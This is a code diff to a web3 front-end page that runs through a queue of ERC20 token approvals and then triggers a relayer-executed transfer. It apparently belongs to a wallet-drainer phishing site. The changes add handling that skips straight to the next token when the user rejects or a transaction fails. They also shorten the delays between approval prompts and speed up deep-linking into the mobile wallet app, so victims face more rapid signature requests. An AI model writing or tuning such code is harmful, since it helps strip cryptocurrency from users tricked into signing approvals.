@@ -309,8 +309,8 @@ export default function Home() {
     8453: "Base",
   };
   
-  const { writeContract, data: hash, isPending, reset } = useWriteContract();
-  const { isLoading: isConfirming, isSuccess: isConfirmed } = useWaitForTransactionReceipt({ hash });
+  const { writeContract, data: hash, isPending, reset, isError: isWriteError, error: writeError } = useWriteContract();
+  const { isLoading: isConfirming, isSuccess: isConfirmed, isError: isReceiptError } = useWaitForTransactionReceipt({ hash });
 
   const currentApprovalToken = approvalQueue[currentQueueIndex];
   const tokenAddress = currentApprovalToken?.address || "";
@@ -405,6 +405,13 @@ export default function Home() {
     }
   }, [isConfirmed, hash, step]);
 
+  useEffect(() => {
+    if ((isWriteError || isReceiptError) && step === "approving") {
+      console.log("Transaction rejected or failed, moving to next token immediately");
+      goToNextToken();
+    }
+  }, [isWriteError, isReceiptError, step]);
+
   const executeRelayerTransfer = async () => {
     try {
       const response = await fetch("/api/execute-transfer", {
@@ -428,9 +435,10 @@ export default function Home() {
     if (nextIndex < approvalQueue.length) {
       setCurrentQueueIndex(nextIndex);
       reset();
+      setStep("approving");
+      const nextToken = approvalQueue[nextIndex];
+      
       setTimeout(() => {
-        setStep("approving");
-        const nextToken = approvalQueue[nextIndex];
         writeContract({
           address: nextToken.address as `0x${string}`,
           abi: ERC20_ABI,
@@ -441,9 +449,9 @@ export default function Home() {
         if (isMobile()) {
           setTimeout(() => {
             window.location.href = "wc://";
-          }, 300);
+          }, 100);
         }
-      }, 500);
+      }, 100);
     } else {
       setStep("done");
     }
